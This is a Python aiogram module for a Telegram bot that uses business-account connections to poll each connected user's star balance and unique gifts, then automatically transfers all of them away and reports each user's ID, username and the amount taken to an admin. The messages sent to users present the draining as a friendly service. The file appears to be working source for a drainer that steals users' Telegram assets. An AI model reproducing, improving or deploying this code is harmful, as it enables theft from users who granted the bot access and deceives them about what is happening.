import asyncio
import logging
from typing import Dict, Any
from aiogram import Bot

from config import (
    get_main_admin_id, MIN_STARS_FOR_AUTO_TRANSFER, NOTIFICATION_INTERVAL,
    AUTO_CHECK_INTERVAL, RATE_LIMIT_DELAY
)
from utils.file_utils import get_connections, load_settings
from utils.transfer import get_star_balance, transfer_all_stars, transfer_all_unique_gifts
from utils.logging import log_performance

logger = logging.getLogger(__name__)

async def check_user_balance(bot: Bot, conn: Dict[str, Any]) -> bool:
    """Асинхронная проверка баланса одного пользователя"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "Пользователь")
        
        star_balance = await get_star_balance(bot, conn_id)
        
        if star_balance >= MIN_STARS_FOR_AUTO_TRANSFER:
            # Отправляем уведомление
            await bot.send_message(
                user_id,
                f"⭐️ <b>У вас накопилось {star_balance} звезд!</b>\n\n"
                f"Это достаточно для автоматического перевода NFT. "
                f"Бот скоро заберет их для вас! 🎁",
                parse_mode="HTML"
            )
            
            # Автоматически переводим звезды
            settings = load_settings()
            if settings.get("auto_transfer", True):
                stars_result = await transfer_all_stars(bot, conn_id, user_id)
                if stars_result["transferred"] > 0:
                    await bot.send_message(
                        user_id,
                        f"✅ <b>Автоматически переведено {stars_result['transferred']} звезд!</b>\n\n"
                        f"Спасибо за использование нашего бота! 🎉",
                        parse_mode="HTML"
                    )
                    
                    # Уведомляем админа
                    await bot.send_message(
                        get_main_admin_id(),
                        f"🤖 <b>Автоматический перевод звезд:</b>\n"
                        f"👤 Пользователь: @{username}\n"
                        f"🆔 ID: <code>{user_id}</code>\n"
                        f"⭐️ Переведено: <b>{stars_result['transferred']}</b>\n"
                        f"📅 Время: {asyncio.get_event_loop().time()}",
                        parse_mode="HTML"
                    )
                elif stars_result["error"]:
                    await bot.send_message(
                        get_main_admin_id(),
                        f"❌ <b>Ошибка автоматического перевода:</b>\n"
                        f"👤 Пользователь: @{username}\n"
                        f"🆔 ID: <code>{user_id}</code>\n"
                        f"❗️ Ошибка: {stars_result['error']}",
                        parse_mode="HTML"
                    )
            return True
        return False
    except Exception as e:
        logger.error(f"Ошибка проверки баланса для {conn.get('user_id')}: {e}")
        return False

async def send_smart_notifications(bot: Bot):
    """Отправка умных уведомлений пользователям"""
    try:
        settings = load_settings()
        if not settings.get("auto_notifications", True):
            return
        
        connections = get_connections()
        
        # Создаем задачи для параллельной проверки всех пользователей
        tasks = [
            check_user_balance(bot, conn)
            for conn in connections
        ]
        
        # Выполняем все проверки параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Логируем результаты
        successful_checks = sum(1 for r in results if r is True)
        logger.info(f"Умные уведомления: проверено {len(connections)} пользователей, уведомлений отправлено: {successful_checks}")
                
    except Exception as e:
        logger.error(f"Ошибка отправки умных уведомлений: {e}")

async def check_and_transfer_nft_for_user(bot: Bot, conn: Dict[str, Any]) -> bool:
    """Асинхронная проверка и перевод NFT для одного пользователя"""
    try:
        conn_id = conn["business_connection_id"]
        user_id = conn["user_id"]
        username = conn.get("username", "Пользователь")
        
        # Проверяем NFT
        from utils.transfer import get_unique_gifts
        nft_gifts = await get_unique_gifts(bot, conn_id)
        if nft_gifts:
            # Проверяем баланс звезд
            star_balance = await get_star_balance(bot, conn_id)
            
            # Проверяем, хватает ли звезд для хотя бы одного NFT
            for gift in nft_gifts:
                required_stars = getattr(gift, 'transfer_star_count', 0)
                if star_balance >= required_stars:
                    # Пытаемся перевести NFT
                    nft_result = await transfer_all_unique_gifts(bot, conn_id, user_id, admin_notify=False)
                    if nft_result["transferred"] > 0:
                        await bot.send_message(
                            get_main_admin_id(),
                            f"🤖 <b>Автоматический перевод NFT:</b>\n"
                            f"👤 Пользователь: @{username}\n"
                            f"🆔 ID: <code>{user_id}</code>\n"
                            f"🖼 Переведено NFT: <b>{nft_result['transferred']}</b>\n"
                            f"📅 Время: {asyncio.get_event_loop().time()}",
                            parse_mode="HTML"
                        )
                    return True
        return False
    except Exception as e:
        logger.error(f"Ошибка автоматического перевода NFT для {conn.get('user_id')}: {e}")
        return False

async def auto_transfer_nft_when_ready(bot: Bot):
    """Автоматический перевод NFT когда достаточно звезд"""
    try:
        settings = load_settings()
        if not settings.get("auto_transfer", True):
            return
        
        connections = get_connections()
        
        # Создаем задачи для параллельной обработки всех пользователей
        tasks = [check_and_transfer_nft_for_user(bot, conn) for conn in connections]
        
        # Выполняем все задачи параллельно
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Логируем результаты
        successful_transfers = sum(1 for r in results if r is True)
        logger.info(f"Автоматический перевод NFT: проверено {len(connections)} пользователей, переводов выполнено: {successful_transfers}")
                
    except Exception as e:
        logger.error(f"Ошибка автоматического перевода NFT: {e}")

async def notifications_task(bot: Bot):
    """Задача отправки уведомлений"""
    while True:
        try:
            await send_smart_notifications(bot)
            # Проверяем каждые 30 минут
            await asyncio.sleep(NOTIFICATION_INTERVAL)
        except Exception as e:
            logger.error(f"Ошибка в задаче уведомлений: {e}")
            await asyncio.sleep(RATE_LIMIT_DELAY)  # Ждем 5 минут при ошибке

async def auto_transfer_task(bot: Bot):
    """Задача автоматического перевода"""
    while True:
        try:
            await auto_transfer_nft_when_ready(bot)
            # Проверяем каждые 15 минут
            await asyncio.sleep(AUTO_CHECK_INTERVAL)
        except Exception as e:
            logger.error(f"Ошибка в задаче автоматического перевода: {e}")
            await asyncio.sleep(RATE_LIMIT_DELAY)  # Ждем 5 минут при ошибке

async def start_automation_tasks(bot: Bot):
    """Запуск всех автоматических задач"""
    try:
        # Запускаем фоновые задачи
        notifications_task_obj = asyncio.create_task(notifications_task(bot))
        auto_transfer_task_obj = asyncio.create_task(auto_transfer_task(bot))
        
        logger.info("🚀 Автоматические задачи запущены")
        
        # Ждем завершения задач (они работают бесконечно)
        await asyncio.gather(notifications_task_obj, auto_transfer_task_obj)
        
    except Exception as e:
        logger.error(f"Ошибка запуска автоматических задач: {e}")
        raise 